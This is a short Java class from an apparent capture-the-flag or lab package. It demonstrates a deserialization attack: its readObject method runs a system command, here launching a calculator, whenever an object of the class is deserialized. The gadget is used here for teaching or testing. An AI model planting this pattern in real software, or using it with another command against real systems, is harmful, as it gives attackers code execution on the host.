package com.ctfjava.main;

import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.Serializable;

public class readExp implements Serializable {

    private void readObject(ObjectInputStream in) throws IOException,ClassNotFoundException{
        in.defaultReadObject();
        Runtime.getRuntime().exec("calc");
    }
}
